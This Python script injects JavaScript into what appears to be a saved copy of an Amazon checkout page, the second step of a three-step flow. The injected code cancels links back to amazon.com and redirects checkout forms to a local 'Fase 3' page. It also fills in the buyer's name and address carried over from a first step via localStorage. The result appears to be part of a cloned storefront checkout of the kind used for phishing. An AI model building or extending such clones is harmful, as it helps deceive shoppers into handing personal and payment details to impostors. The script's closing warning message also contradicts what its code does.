import os

def inject_js():
    path = 'Checkout - Fase 2.html'
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    inject = """
<script>
(function() {
    // Bloqueio Amazon
    var blockList = ['amazon.com', 'amazon.com.br'];
    document.addEventListener('click', function(e) {
        var a = e.target.closest('a');
        if (a && a.href && blockList.some(function(d) { return a.href.indexOf(d) !== -1; })) {
            e.preventDefault();
        }
    }, true);

    // Redirecionar forms para Fase 3 (caso algum tenha sobrado)
    document.querySelectorAll('form').forEach(function(f) {
        if (f.action.indexOf('amazon') !== -1 || f.action.indexOf('/checkout/') !== -1) {
            f.action = 'Checkout - Fase 3.html';
        }
    });

    // Fix Alterar endereco link
    var changeAddr = document.getElementById('change-delivery-link');
    if (changeAddr) {
        changeAddr.href = 'Checkout - Fase 1.html';
        changeAddr.removeAttribute('onclick');
    }

    // Carregar dados da Fase 1
    var raw = localStorage.getItem('checkout_address');
    if (!raw) return;
    var data = JSON.parse(raw);
    
    var nome = data.nome || 'Cliente';
    var parts = [];
    if (data.rua) parts.push(data.rua);
    if (data.numero) parts.push(data.numero);
    if (data.bairro) parts.push(data.bairro);
    if (data.cidade) parts.push(data.cidade);
    if (data.estado) parts.push(data.estado);
    if (data.cep) parts.push(data.cep);
    parts.push('Brasil');
    var endereco = parts.join(', ');

    var els = document.querySelectorAll('span, div, b, strong, p, h2, h3');
    els.forEach(function(el) {
        // We might be operating on elements that have children.
        // It's safer to only modify if childNodes span contains only text or if we check nodeValue.
        // Let's do a simple replace on the entire text content, but we must be careful not to destroy inner elements if the match is too broad.
        
        if (el.textContent.trim() === 'Seu nome') {
             el.textContent = nome;
        } else if (el.textContent.trim() === 'Seu endereço') {
             el.textContent = endereco;
        } else if (el.textContent.trim() === 'Said' || el.textContent.trim() === 'Cliente') {
             var primeiroNome = nome.split(' ')[0];
             el.textContent = ' ' + primeiroNome;
        } else {
             // For "Entrega para Seu nome"
             if (el.childNodes.length > 0) {
                 for (var i=0; i<el.childNodes.length; i++) {
                     var node = el.childNodes[i];
                     if (node.nodeType === 3) { // Text node
                         if (node.nodeValue.indexOf('Seu nome') !== -1) {
                             node.nodeValue = node.nodeValue.replace('Seu nome', nome);
                         }
                         if (node.nodeValue.indexOf('Seu endereço') !== -1) {
                             node.nodeValue = node.nodeValue.replace('Seu endereço', endereco);
                         }
                     }
                 }
             }
        }
    });
})();
</script>
"""
    # Append inject if not already there
    if 'localStorage.getItem(\'checkout_address\')' not in content:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(inject)
        print("Script injetado com sucesso no final do arquivo.")
    else:
        # Just update it. For safety let's just do a string replace of the previous script block if it exists,
        # but since I know it wasn't added because it was missing </body>, I'll just append.
        print("Aviso: o script parece já estar lá, mas vou adicioná-lo de qualquer forma (certifique-se de que não haja duplicação).")
        pass

if __name__ == "__main__":
    inject_js()
